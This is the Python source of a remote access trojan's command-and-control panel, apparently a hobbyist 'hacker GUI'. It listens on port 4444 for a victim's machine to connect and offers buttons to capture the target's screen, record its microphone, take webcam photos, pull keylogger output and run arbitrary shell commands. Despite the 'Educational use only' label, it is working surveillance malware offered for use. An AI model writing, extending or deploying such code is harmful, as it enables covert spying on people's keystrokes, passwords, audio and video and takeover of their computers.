# KHEMRA REMOTE - Kali Linux Hacker GUI
# Created by Khemra (Educational use only)

import socket, tkinter as tk
from tkinter import messagebox
from PIL import ImageTk, Image
import io, datetime

HOST = '0.0.0.0'
PORT = 4444

# Set up server and wait for target
server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)
messagebox.showinfo("KHEMRA REMOTE", "Waiting for target connection...")
client, addr = server.accept()
messagebox.showinfo("KHEMRA REMOTE", f"Connected from {addr}")

# Save received files
def save_file(data, prefix, ext):
    filename = f"{prefix}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.{ext}"
    with open(filename, 'wb') as file:
        file.write(data)
    return filename

# Send command to target clearly
def send_command(cmd):
    client.send(cmd.encode())
    data = b''
    while True:
        packet = client.recv(4096)
        if packet.endswith(b"<END>"):
            data += packet[:-5]
            break
        data += packet
    return data

# Screenshot function clearly
def screenshot():
    data = send_command('screenshot')
    filename = save_file(data, 'screenshot', 'png')
    img = Image.open(io.BytesIO(data)).resize((500,280))
    img = ImageTk.PhotoImage(img)
    output_panel.config(image=img)
    output_panel.image = img
    messagebox.showinfo("Screenshot", f"Saved as {filename}")

# Live screen clearly (auto-refresh)
live_screen_active = False

def live_screen():
    global live_screen_active
    if live_screen_active:
        data = send_command('screenshot')
        img = Image.open(io.BytesIO(data)).resize((500,280))
        img = ImageTk.PhotoImage(img)
        output_panel.config(image=img)
        output_panel.image = img
        gui.after(1000, live_screen)

def start_live():
    global live_screen_active
    live_screen_active = True
    live_screen()

def stop_all():
    global live_screen_active
    live_screen_active = False
    output_panel.config(image='')
    messagebox.showinfo("KHEMRA REMOTE", "All processes stopped clearly.")

# Voice recording clearly
def voice():
    data = send_command('voice')
    filename = save_file(data, 'audio', 'wav')
    messagebox.showinfo("Voice Record", f"Saved as {filename}")

# Webcam photo clearly
def webcam():
    data = send_command('webcam')
    filename = save_file(data, 'webcam', 'png')
    messagebox.showinfo("Webcam Photo", f"Saved as {filename}")

# Keylogger clearly
def keylogger():
    data = send_command('keylogger')
    filename = save_file(data, 'keylog', 'txt')
    messagebox.showinfo("Keylogger", f"Saved as {filename}")

# Command execution clearly
def run_cmd():
    cmd = entry.get()
    result = send_command(cmd).decode()
    output_box.delete('1.0', tk.END)
    output_box.insert(tk.END, result)

# GUI setup clearly
gui = tk.Tk()
gui.title("💀 KHEMRA REMOTE TOOL 💀")
gui.geometry("1050x700")
gui.config(bg="#0C0C0C")

# Left side (Control Panel)
left_frame = tk.Frame(gui, bg="#0C0C0C")
left_frame.pack(side='left', padx=10, pady=10)

tk.Label(left_frame, text="⚡ KHEMRA TOOL ⚡", fg="#39FF14", bg="#0C0C0C",
         font=("Courier", 25, 'bold')).pack(pady=15)

tk.Button(left_frame, text="🟢 Start Live Screen", bg="#39FF14", width=20,
          command=start_live).pack(pady=5)
tk.Button(left_frame, text="🔴 Stop All Processes", bg="#FF073A", width=20,
          command=stop_all).pack(pady=5)
tk.Button(left_frame, text="📸 Screenshot", bg="#39FF14", width=20,
          command=screenshot).pack(pady=5)
tk.Button(left_frame, text="🎙️ Voice Record (5s)", bg="#39FF14", width=20,
          command=voice).pack(pady=5)
tk.Button(left_frame, text="📷 Webcam Photo", bg="#39FF14", width=20,
          command=webcam).pack(pady=5)
tk.Button(left_frame, text="⌨️ Keylogger", bg="#39FF14", width=20,
          command=keylogger).pack(pady=5)

entry = tk.Entry(left_frame, width=40, bg="#222222", fg="white", font=('Courier', 12))
entry.pack(pady=5)

tk.Button(left_frame, text="🚀 Execute Command 🚀", bg="#39FF14",
          command=run_cmd).pack(pady=5)

output_box = tk.Text(left_frame, height=10, bg="#222222", fg="#39FF14",
                     font=('Courier', 12))
output_box.pack(pady=5)

# Right side (Output Panel)
right_frame = tk.Frame(gui, bg="#0C0C0C")
right_frame.pack(side='right', padx=10, pady=10)

tk.Label(right_frame, text="📡 TARGET LIVE SCREEN 📡", fg="#39FF14",
         bg="#0C0C0C", font=("Courier", 18, 'bold')).pack(pady=10)

output_panel = tk.Label(right_frame, bg="#0C0C0C")
output_panel.pack()

gui.mainloop()
